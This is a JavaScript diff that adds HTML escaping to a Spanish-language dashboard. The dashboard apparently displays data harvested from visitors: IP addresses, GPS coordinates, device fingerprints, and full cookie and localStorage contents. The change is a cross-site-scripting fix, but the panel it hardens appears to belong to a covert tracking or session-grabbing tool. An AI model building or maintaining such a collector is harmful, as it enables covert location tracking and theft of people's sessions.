@@ -414,9 +414,9 @@ function updateMap(items) {
 
       marker.bindPopup(`
         <div style="font-family: 'Fira Code', monospace; font-size:0.8rem; color:#12121a;">
-          <strong>${item.ip || 'N/A'}</strong><br/>
-          📍 ${geo.city || 'Desconocida'}, ${geo.country || ''}<br/>
-          📱 ${item.platform || 'N/A'}
+          <strong>${escapeHTML(item.ip || 'N/A')}</strong><br/>
+          📍 ${escapeHTML(geo.city || 'Desconocida')}, ${escapeHTML(geo.country || '')}<br/>
+          📱 ${escapeHTML(item.platform || 'N/A')}
         </div>
       `);
 
@@ -457,43 +457,43 @@ function openDrawer(item) {
   const gps = geo.gps || {};
   const lat = gps.lat || geo.lat;
   const lng = gps.lng || geo.lng;
-  const mapUrl = (lat && lng) ? `https://www.google.com/maps?q=${lat},${lng}` : '#';
+  const mapUrl = (lat && lng) ? `https://www.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lng)}` : '#';
 
   container.innerHTML = `
     <div class="detail-group">
       <div class="detail-label">ID de Sesión</div>
-      <div class="detail-value-box" style="color:#00ff88;">${item.sessionId || 'N/A'}</div>
+      <div class="detail-value-box" style="color:#00ff88;">${escapeHTML(item.sessionId || 'N/A')}</div>
     </div>
 
     <div class="detail-group">
       <div class="detail-label">IP Pública & Geolocalización</div>
       <div class="detail-value-box">
-        🌐 IP: <strong>${item.ip || 'N/A'}</strong><br/>
-        📍 Ubicación: ${geo.city || 'Desconocida'}, ${geo.region || ''}, ${geo.country || ''}<br/>
-        📡 Proveedor ISP: ${geo.isp || 'N/A'}
-        ${lat ? `<br/><br/><a href="${mapUrl}" target="_blank" style="color:#00a8ff; font-weight:700;">🔗 Abrir Coordenadas en Google Maps (${lat}, ${lng})</a>` : ''}
+        🌐 IP: <strong>${escapeHTML(item.ip || 'N/A')}</strong><br/>
+        📍 Ubicación: ${escapeHTML(geo.city || 'Desconocida')}, ${escapeHTML(geo.region || '')}, ${escapeHTML(geo.country || '')}<br/>
+        📡 Proveedor ISP: ${escapeHTML(geo.isp || 'N/A')}
+        ${lat ? `<br/><br/><a href="${mapUrl}" target="_blank" style="color:#00a8ff; font-weight:700;">🔗 Abrir Coordenadas en Google Maps (${escapeHTML(lat)}, ${escapeHTML(lng)})</a>` : ''}
       </div>
     </div>
 
     <div class="detail-group">
       <div class="detail-label">Entorno, GPU & Hardware Avanzado</div>
       <div class="detail-value-box">
-        📱 Plataforma / SO: ${item.platform || 'N/A'}<br/>
-        🎮 Gráficos / GPU: <span style="color:#00ff88;">${item.webglRenderer || 'N/A'}</span><br/>
-        🖥️ Pantalla: ${item.screenWidth || 'N/A'}x${item.screenHeight || 'N/A'} (Color Depth: ${item.colorDepth || 'N/A'} bits, Ratio: ${item.pixelRatio || 1})<br/>
-        🧠 CPU Cores: ${item.hardwareConcurrency || 'N/A'} | RAM: ~${item.deviceMemory || 'N/A'} GB | Puntos Táctiles: ${item.maxTouchPoints || 0}<br/>
-        🔋 Batería: ${item.battery ? `${item.battery.level} (${item.battery.charging ? '⚡ Cargando' : '🔋 Desconectado'})` : 'N/A'}<br/>
-        🌐 Tipo Red: ${item.connectionType || 'N/A'} | Bajada: ${item.downlink || 'N/A'} | RTT Latencia: ${item.rtt || 'N/A'}<br/>
-        🔒 DoNotTrack: ${item.doNotTrack || 'No activo'}<br/>
-        🌐 User-Agent: ${item.userAgent || 'N/A'}
+        📱 Plataforma / SO: ${escapeHTML(item.platform || 'N/A')}<br/>
+        🎮 Gráficos / GPU: <span style="color:#00ff88;">${escapeHTML(item.webglRenderer || 'N/A')}</span><br/>
+        🖥️ Pantalla: ${escapeHTML(item.screenWidth || 'N/A')}x${escapeHTML(item.screenHeight || 'N/A')} (Color Depth: ${escapeHTML(item.colorDepth || 'N/A')} bits, Ratio: ${escapeHTML(item.pixelRatio || 1)})<br/>
+        🧠 CPU Cores: ${escapeHTML(item.hardwareConcurrency || 'N/A')} | RAM: ~${escapeHTML(item.deviceMemory || 'N/A')} GB | Puntos Táctiles: ${escapeHTML(item.maxTouchPoints || 0)}<br/>
+        🔋 Batería: ${item.battery ? `${escapeHTML(item.battery.level)} (${item.battery.charging ? '⚡ Cargando' : '🔋 Desconectado'})` : 'N/A'}<br/>
+        🌐 Tipo Red: ${escapeHTML(item.connectionType || 'N/A')} | Bajada: ${escapeHTML(item.downlink || 'N/A')} | RTT Latencia: ${escapeHTML(item.rtt || 'N/A')}<br/>
+        🔒 DoNotTrack: ${escapeHTML(item.doNotTrack || 'No activo')}<br/>
+        🌐 User-Agent: ${escapeHTML(item.userAgent || 'N/A')}
       </div>
     </div>
 
     <div class="detail-group">
       <div class="detail-label">Datos de Almacenamiento Local (Cookies / Storage)</div>
       <div class="detail-value-box" style="max-height: 150px; overflow-y: auto; font-size:0.75rem;">
-        <strong>Cookies:</strong> ${item.cookies || 'Ninguna'}<br/><br/>
-        <strong>LocalStorage:</strong> ${JSON.stringify(item.localStorage || {}, null, 2)}
+        <strong>Cookies:</strong> ${escapeHTML(item.cookies || 'Ninguna')}<br/><br/>
+        <strong>LocalStorage:</strong> ${escapeHTML(JSON.stringify(item.localStorage || {}, null, 2))}
       </div>
     </div>
   `;
